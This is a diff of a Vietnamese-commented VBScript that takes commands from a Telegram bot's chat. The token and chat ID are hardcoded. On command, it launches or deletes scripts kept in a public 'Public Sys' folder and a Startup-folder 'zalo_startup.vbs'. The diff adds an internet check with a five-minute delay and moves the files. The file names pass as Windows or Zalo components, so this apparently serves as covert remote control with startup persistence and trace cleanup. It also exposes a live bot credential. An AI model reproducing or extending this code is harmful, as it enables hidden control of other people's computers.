@@ -1,8 +1,7 @@
 Option Explicit
 On Error Resume Next
 
-
-Dim botToken, chatId, apiUrl, xmlhttp
+Dim botToken, chatId, apiUrl, xmlhttp, hasInternet
 
 ' Thay đổi các giá trị sau theo thông tin của bot của bạn
 botToken = "7172346253:AAFA5umBz4nIwIXDXUd8ksJMmzkW5HWgViw"
@@ -11,7 +10,28 @@ chatId = "7250748991"
 ' Tạo URL cho API của Telegram
 apiUrl = "https://api.telegram.org/bot" & botToken & "/getUpdates?offset=-1"
 
-' Tạo đối tượng XMLHTTP để gửi yêu cầu đến API của Telegram
+' Hàm kiểm tra kết nối mạng
+Function CheckInternetConnection()
+    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
+    xmlhttp.Open "GET", "http://www.google.com", False
+    xmlhttp.Send
+    
+    If xmlhttp.Status = 200 Then
+        CheckInternetConnection = True
+    Else
+        CheckInternetConnection = False
+    End If
+End Function
+
+' Kiểm tra kết nối mạng, nếu không có thì chờ 5 phút
+hasInternet = CheckInternetConnection()
+
+If Not hasInternet Then
+    ' Chờ 5 phút (300000 milliseconds = 5 phút)
+    WScript.Sleep 300000
+End If
+
+' Sau khi chờ, tiếp tục chạy mã
 Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
 
 ' Gửi yêu cầu GET đến API của Telegram
@@ -41,14 +61,21 @@ If xmlhttp.Status = 200 Then
         
         ' Xóa file Window_d.vbs
         Dim scriptToDelete
-        scriptToDelete = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Public Sys\Window_p.vbs"
+        scriptToDelete = "C:\Users\Public\Public Sys\Window_p.vbs"
         If objFSO.FileExists(scriptToDelete) Then
-            objFSO.DeleteFile scriptToDelete
+            objFSO.DeleteFile(scriptToDelete)
         End If
-	
-        scriptToDelete = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Public Sys\system_control.ps1"
+        scriptToDelete = "C:\Users\TRONG DOAN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\zalo_startup.vbs"
         If objFSO.FileExists(scriptToDelete) Then
-            objFSO.DeleteFile scriptToDelete
+            objFSO.DeleteFile(scriptToDelete)
+        End If	
+        scriptToDelete = "C:\Users\Public\Public Sys\system_control.ps1"
+        If objFSO.FileExists(scriptToDelete) Then
+            objFSO.DeleteFile(scriptToDelete)
+        End If
+        scriptToDelete = "C:\Users\Public\Public Sys\setup_window.vbs"
+        If objFSO.FileExists(scriptToDelete) Then
+            objFSO.DeleteFile(scriptToDelete)
         End If
         
         Set objFSO = Nothing
@@ -56,7 +83,7 @@ If xmlhttp.Status = 200 Then
         ' Nếu tin nhắn là "TIEP", chạy file Window_d.vbs
 	Dim shell
 	Set shell = CreateObject("WScript.Shell")
-	shell.Run """C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Public Sys\Window_p.vbs""", 1, False
+	shell.Run """C:\Users\Public\Public Sys\Window_p.vbs""", 1, False
 	Set shell = Nothing
 
     ElseIf StrComp(Left(lastMessage, 4), "DUNG", vbTextCompare) = 0 Then
